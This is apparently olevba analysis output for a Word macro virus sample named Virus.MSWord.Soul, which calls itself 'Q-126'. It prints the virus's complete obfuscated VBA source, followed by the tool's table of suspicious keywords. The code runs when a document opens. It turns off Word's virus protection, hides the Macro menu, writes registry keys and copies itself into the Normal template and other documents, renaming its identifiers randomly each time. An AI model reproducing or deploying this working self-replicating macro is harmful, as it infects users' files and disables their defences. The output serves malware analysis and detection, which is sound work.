olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soul-880d0a6892ab76060cb1e72b89edb7fa7ebe0f4d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soul-880d0a6892ab76060cb1e72b89edb7fa7ebe0f4d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim †èœ„ì�©ýüÝ(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const þ¶Õ÷ÊõÒÜ�þø = "ActiveDocument"
On Error Resume Next
Select Case þ¶Õ÷ÊõÒÜ�þø
Case "ActiveDocument"
    Set ˜‘ÈýºÉ¿Ûã‰½À× = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ã¬Ò�²áÓ¹ˆžŸ›§ = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set ã¬Ò�²áÓ¹ˆžŸ›§ = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ˜‘ÈýºÉ¿Ûã‰½À× = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" '�ÔØ©Úçûá°Æ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If ã¬Ò�²áÓ¹ˆžŸ›§.Countoflines > 100 Then
Exit Sub
Else
Call ð„Ííë”�£�Ì(ã¬Ò�²áÓ¹ˆžŸ›§, ˜‘ÈýºÉ¿Ûã‰½À×)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function ð„Ííë”�£�Ì(ByVal ß¸Œ’Ä‹–¸Ñ…¦‡ä, ÞÛ¡òŸú†Å‡¢“)
Dim ¸ð§âÏÆâ�±åÇÞ, �ÔØ©Úçûá°Æ, ÃÏ‰š«õ–•¼ÅË· As Integer
Dim šˆà´ºì³¾ß×­ÎŽ As String
†èœ„ì�©ýüÝ(1, 1) = "†èœ„ì�©ýüÝ"
†èœ„ì�©ýüÝ(2, 1) = "þ¶Õ÷ÊõÒÜ�þø"
†èœ„ì�©ýüÝ(3, 1) = "˜‘ÈýºÉ¿Ûã‰½À×"
†èœ„ì�©ýüÝ(4, 1) = "ã¬Ò�²áÓ¹ˆžŸ›§"
†èœ„ì�©ýüÝ(5, 1) = "ð„Ííë”�£�Ì"
†èœ„ì�©ýüÝ(6, 1) = "ß¸Œ’Ä‹–¸Ñ…¦‡ä"
†èœ„ì�©ýüÝ(7, 1) = "ÞÛ¡òŸú†Å‡¢“"
†èœ„ì�©ýüÝ(8, 1) = "¸ð§âÏÆâ�±åÇÞ"
†èœ„ì�©ýüÝ(9, 1) = "�ÔØ©Úçûá°Æ"
†èœ„ì�©ýüÝ(10, 1) = "ÃÏ‰š«õ–•¼ÅË·"
†èœ„ì�©ýüÝ(11, 1) = "šˆà´ºì³¾ß×­ÎŽ"
†èœ„ì�©ýüÝ(12, 1) = "Ðä…ÉùÆƒ®í¯"
†èœ„ì�©ýüÝ(13, 1) = "»è¿öÎé÷íŒµÙë"
†èœ„ì�©ýüÝ(14, 1) = "ˆÁ´ü‚Ñà‘¥‹ØÌÎ"
†èœ„ì�©ýüÝ(15, 1) = "Ö±ÂÓû¾¼ãËÒ½ú"
†èœ„ì�©ýüÝ(16, 1) = "�ŠÜÀòÛÄæ�ÕÔµ"
For �ÔØ©Úçûá°Æ = 1 To 16
    †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 2) = »è¿öÎé÷íŒµÙë
Next �ÔØ©Úçûá°Æ
�ÔØ©Úçûá°Æ = ß¸Œ’Ä‹–¸Ñ…¦‡ä.Countoflines
For ¸ð§âÏÆâ�±åÇÞ = 1 To �ÔØ©Úçûá°Æ
    ß¸Œ’Ä‹–¸Ñ…¦‡ä.�ŠÜÀòÛÄæ�ÕÔµLine ¸ð§âÏÆâ�±åÇÞ, "'"
Next ¸ð§âÏÆâ�±åÇÞ
�ÔØ©Úçûá°Æ = ß¸Œ’Ä‹–¸Ñ…¦‡ä.Countoflines
For ÃÏ‰š«õ–•¼ÅË· = 1 To ÞÛ¡òŸú†Å‡¢“.Countoflines
šˆà´ºì³¾ß×­ÎŽ = ÞÛ¡òŸú†Å‡¢“.Lines(ÃÏ‰š«õ–•¼ÅË·, 1)
   Select Case šˆà´ºì³¾ß×­ÎŽ
   Case "Const þ¶Õ÷ÊõÒÜ�þø = ""ActiveDocument"""
       šˆà´ºì³¾ß×­ÎŽ = "Const þ¶Õ÷ÊõÒÜ�þø = ""NormalTemplate"""
   Case "Const þ¶Õ÷ÊõÒÜ�þø = ""NormalTemplate"""
       šˆà´ºì³¾ß×­ÎŽ = "Const þ¶Õ÷ÊõÒÜ�þø = ""ActiveDocument"""
   Case "'"
       GoTo Ö±ÂÓû¾¼ãËÒ½ú
   End Select
   ß¸Œ’Ä‹–¸Ñ…¦‡ä.InsertLines (�ÔØ©Úçûá°Æ + ÃÏ‰š«õ–•¼ÅË·), �ŠÜÀòÛÄæ�ÕÔµ(šˆà´ºì³¾ß×­ÎŽ)
Ö±ÂÓû¾¼ãËÒ½ú:
Next ÃÏ‰š«õ–•¼ÅË·
End Function
Private Function �ŠÜÀòÛÄæ�ÕÔµ(ˆÁ´ü‚Ñà‘¥‹ØÌÎ As String)
Dim šˆà´ºì³¾ß×­ÎŽ As String
Dim Ðä…ÉùÆƒ®í¯ As Boolean
Dim ÃÏ‰š«õ–•¼ÅË·, �ÔØ©Úçûá°Æ As Integer
For �ÔØ©Úçûá°Æ = 1 To 16
Ðä…ÉùÆƒ®í¯ = True
While Ðä…ÉùÆƒ®í¯ = True
  Ðä…ÉùÆƒ®í¯ = False
  For ÃÏ‰š«õ–•¼ÅË· = 1 To (Len(ˆÁ´ü‚Ñà‘¥‹ØÌÎ) - Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)) + 1)
    šˆà´ºì³¾ß×­ÎŽ = Mid(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, ÃÏ‰š«õ–•¼ÅË·, Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)))
    If šˆà´ºì³¾ß×­ÎŽ = †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1) Then
      ˆÁ´ü‚Ñà‘¥‹ØÌÎ = Left(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, ÃÏ‰š«õ–•¼ÅË· - 1) & †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 2) & Right(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, Len(ˆÁ´ü‚Ñà‘¥‹ØÌÎ) - ÃÏ‰š«õ–•¼ÅË· - Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)) + 1)
      Ðä…ÉùÆƒ®í¯ = True
    End If
 Next ÃÏ‰š«õ–•¼ÅË·
Wend
Next �ÔØ©Úçûá°Æ
�ŠÜÀòÛÄæ�ÕÔµ = ˆÁ´ü‚Ñà‘¥‹ØÌÎ
End Function
Private Function »è¿öÎé÷íŒµÙë()
Dim ÃÏ‰š«õ–•¼ÅË· As Integer
»è¿öÎé÷íŒµÙë = ""
Randomize
ÃÏ‰š«õ–•¼ÅË· = Int((4 * Rnd) + 10)
While Len(»è¿öÎé÷íŒµÙë) < ÃÏ‰š«õ–•¼ÅË·
    Randomize
    »è¿öÎé÷íŒµÙë = »è¿öÎé÷íŒµÙë + Chr(Int((126 * Rnd) + 129))
Wend
End Function






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

